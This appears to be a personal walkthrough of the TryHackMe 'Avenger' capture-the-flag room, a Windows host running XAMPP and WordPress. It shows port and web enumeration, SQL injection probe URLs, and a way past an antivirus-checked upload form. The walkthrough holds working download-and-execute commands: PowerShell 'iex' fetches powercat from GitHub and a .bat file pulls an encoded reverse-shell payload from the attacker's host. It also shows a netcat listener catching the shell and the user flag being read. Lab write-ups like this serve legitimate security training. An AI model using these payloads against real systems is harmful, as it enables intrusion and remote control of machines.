<code>

## Avanger


https://tryhackme.com/r/room/avenger

### Emulation
└─$ nmap  -sV -Pn -p-  10.10.54.237 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-21 02:29 CDT
Nmap scan report for 10.10.54.237
Host is up (0.037s latency).
Not shown: 65518 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL 5.5.5-10.4.28-MariaDB
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 324.36 seconds


http://10.10.54.237/dashboard/phpinfo.php

**Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 **
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~]
└─$ rpcdump.py -p 135 avanger.thm | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
                                                     


### SMB

┌──(duke㉿kali)-[~]
└─$ smbmap -H 10.10.54.237 
[!] Authentication error on 10.10.54.237
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~]
└─$ smbclient -N -L \\\\10.10.54.237 
session setup failed: NT_STATUS_ACCESS_DENIED

┌──(duke㉿kali)-[~]
└─$ nmap --script smb-vuln* 10.10.54.237 
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-21 03:06 CDT
Nmap scan report for avanger.thm (10.10.54.237)
Host is up (0.038s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds

### MySQL

┌──(duke㉿kali)-[~]
└─$ nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 avanger.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-21 03:12 CDT
Nmap scan report for avanger.thm (10.10.54.237)
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.5-10.4.28-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.28-MariaDB
|   Thread ID: 21
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, Speaks41ProtocolOld, Support41Auth, LongColumnFlag, IgnoreSigpipes, InteractiveClient, ODBCClient, SupportsCompression, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: G,CN?1u{+_~{n6bik[fo
|_  Auth Plugin Name: mysql_native_password
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.01 seconds

RDP 
in cert GIFT


┌──(duke㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://avanger.thm  -x .php,.html,.js -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://avanger.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,php,html
[+] Timeout:                 10s
===============================================================
2024/06/21 03:54:44 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 333] [--> http://avanger.thm/img/]
/wordpress            (Status: 301) [Size: 339] [--> http://avanger.thm/wordpress/]
/applications.html    (Status: 200) [Size: 3607]                                   
/examples             (Status: 503) [Size: 401]                                    
/licenses             (Status: 403) [Size: 420]                                    
/gift                 (Status: 301) [Size: 334] [--> http://avanger.thm/gift/]     
/Applications.html    (Status: 200) [Size: 3607]                                   
/dashboard            (Status: 301) [Size: 339] [--> http://avanger.thm/dashboard/]
/%20                  (Status: 403) [Size: 301]                                    
/IMG                  (Status: 301) [Size: 333] [--> http://avanger.thm/IMG/]      
/Img                  (Status: 301) [Size: 333] [--> http://avanger.thm/Img/]      
/phpmyadmin           (Status: 403) [Size: 301]                                    
/webalizer            (Status: 403) [Size: 420]                                    
/Dashboard            (Status: 301) [Size: 339] [--> http://avanger.thm/Dashboard/]
/xampp                (Status: 301) [Size: 335] [--> http://avanger.thm/xampp/]    
/Gift                 (Status: 301) [Size: 334] [--> http://avanger.thm/Gift/]     
/server-status        (Status: 403) [Size: 420]  

### Wordpress
┌──(duke㉿kali)-[~]
└─$ wpscan --url http://avenger.tryhackme/wordpress --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://avenger.tryhackme/wordpress/ [10.10.54.237]
[+] Started: Fri Jun 21 06:22:21 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
 |  - X-Powered-By: PHP/8.0.28
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://avenger.tryhackme/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://avenger.tryhackme/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://avenger.tryhackme/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://avenger.tryhackme/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2.2 identified (Insecure, released on 2023-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://avenger.tryhackme/gift/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>
 |  - http://avenger.tryhackme/gift/comments/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>

[+] WordPress theme in use: astra
 | Location: http://avenger.tryhackme/wordpress/wp-content/themes/astra/
 | Last Updated: 2024-06-18T00:00:00.000Z
 | Readme: http://avenger.tryhackme/wordpress/wp-content/themes/astra/readme.txt
 | [!] The version is out of date, the latest version is 4.7.1
 | Style URL: http://avenger.tryhackme/wordpress/wp-content/themes/astra/style.css
 | Style Name: Astra
 | Style URI: https://wpastra.com/
 | Description: Astra is fast, fully customizable & beautiful WordPress theme suitable for blog, personal portfolio,...
 | Author: Brainstorm Force
 | Author URI: https://wpastra.com/about/?utm_source=theme_preview&utm_medium=author_link&utm_campaign=astra_theme
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://avenger.tryhackme/wordpress/wp-content/themes/astra/style.css, Match: 'Version: 4.1.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:45 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:45

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://avenger.tryhackme/gift/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jun 21 06:25:05 2024
[+] Requests Done: 51
[+] Cached Requests: 7
[+] Data Sent: 13.062 KB
[+] Data Received: 700.438 KB
[+] Memory used: 188.953 MB
[+] Elapsed time: 00:02:44
                            
http://avenger.tryhackme/wordpress/wp-login.php

### Path Traversal
http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=%2Fembed
http://avenger.tryhackme/gift/#?secret=YajmwYABoc


### Path Traversal
GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=%2Fembed

### SQL Injection
http://avenger.tryhackme/gift/?p=499-2
### SQL - Oracle - Time base
http://avenger.tryhackme/gift/wp-comments-post.php
GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=http%3A%2F%2Favenger.tryhackme%2Fgift%2F2023%2F06%2F27%2Fhello-world%2F%22+%2F+%28SELECT++UTL_INADDR.get_host_name%28%2710.0.0.1%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.2%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.3%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.4%27%29+from+dual+union+SELECT++UTL_INADDR.get_host_name%28%2710.0.0.5%27%29+from+dual%29+%2F+%22
POST http://avenger.tryhackme/gift/wp-comments-post.php
### SQL - SQLite
GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=case+randomblob%2810000000%29+when+not+null+then+1+else+1+end+&url=http%3A%2F%2Favenger.tryhackme%2Fgift%2F2023%2F06%2F27%2Fhello-world%2F
GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?format=xml&url=case+randomblob%28100000%29+when+not+null+then+1+else+1+end+
GET http://avenger.tryhackme/gift/wp-json/oembed/1.0/embed?url=case+randomblob%28100000000%29+when+not+null+then+1+else+1+end+
POST http://avenger.tryhackme/gift/
POST http://avenger.tryhackme/gift/wp-comments-post.php


### http://avenger.tryhackme/gift

## There is upload form with AV checkin - need bypass upload form

┌──(duke㉿kali)-[/Documents/THM_AVenger]
└─$ LHOST=10.9.30.202
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[/Documents/THM_AVenger]
└─$ LPORT=49731      
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[/Documents/THM_AVenger]
└─$ rshell=rs-49731.txt
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[/Documents/THM_AVenger]
└─$ pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > ./$rshell                                   
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[/Documents/THM_AVenger]
└─$ ls
calculator.bat  ntlm_theft  powercat.ps1  req.txt  rev_shell.nim  rs-49731.txt  Screenshot_2024-06-26_06_58_31.png  test.bat  test.xt  t.go
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[/Documents/THM_AVenger]
└─$ cat rs-49731.txt 
ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAo..                                                                                                                                                                                                                                            

┌──(duke㉿kali)-[/Documents/THM_AVenger]
└─$ cat getexp.bat  
START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.9.30.202:9000/shell-49731.txt');iex 'powershell -E $code'
                                                                                                                                                                                                                                            
### run web server on port 9000 for download RS and Upload getexp.bat run RS listener on port 49731

## Get initial Access

┌──(duke㉿kali)-[~]
└─$ nc -lvnp 49731
listening on [any] 49731 ...
connect to [10.9.30.202] from (UNKNOWN) [10.10.156.71] 49871
Microsoft Windows [Version 10.0.17763.4499]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

07/25/2023  02:58 PM               533 .htaccess
06/29/2023  11:09 AM    <DIR>          0cdbb62efcb829a78821aac0e9
11/14/2018  06:56 AM    <DIR>          EFI
05/13/2020  05:58 PM    <DIR>          PerfLogs
11/26/2023  02:56 PM    <DIR>          Program Files
06/27/2023  08:51 AM    <DIR>          Program Files (x86)
06/30/2023  07:52 AM    <DIR>          Users
07/10/2023  07:24 AM    <DIR>          Windows
07/04/2023  10:12 AM    <DIR>          xampp
               1 File(s)            533 bytes
               8 Dir(s)  10,905,255,936 bytes free

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

06/30/2023  07:52 AM    <DIR>          .
06/30/2023  07:52 AM    <DIR>          ..
09/18/2024  07:45 AM    <DIR>          Administrator
11/25/2023  12:15 AM    <DIR>          hugo
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  10,904,109,056 bytes free

C:\Users\hugo\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\hugo\Desktop

07/10/2023  09:40 PM    <DIR>          .
07/10/2023  09:40 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
07/25/2023  02:14 PM                48 user.txt
               3 File(s)          1,129 bytes
               2 Dir(s)  10,904,109,056 bytes free

C:\Users\hugo\Desktop>type user.txt
type user.txt
THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}
C:\Users\hugo\Desktop>net user
net user


